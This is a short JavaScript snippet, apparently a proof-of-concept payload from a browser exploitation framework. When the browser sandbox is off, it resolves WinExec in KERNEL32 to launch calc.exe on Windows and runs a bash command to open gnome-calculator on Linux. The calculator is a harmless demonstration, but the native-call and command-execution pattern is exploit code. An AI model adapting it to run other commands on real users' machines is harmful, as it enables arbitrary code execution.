// Open a calculator on Windows & Linux if the browser sandbox is disabled
{
    if (FINGERPRINT.process.sandboxed === false && FINGERPRINT.platform.arch === "x64") {
        if (FINGERPRINT.platform.os === "Windows") {
            let kernel32 = getBaseAddr("KERNEL32.DLL");
            let winexec = kernel32 + getExportAddr(kernel32, "WinExec");
            callNativeFunction(winexec, getDataAddr(stringToArr("calc")), 0x0n);
            log("[+] Open calc.exe", 1);
        }

        else if (FINGERPRINT.platform.os === "Linux") {
            cmdExec("bash -c 'DISPLAY=:0 gnome-calculator'");
            log("[+] Open gnome-calculator", 1);
        }
    }
}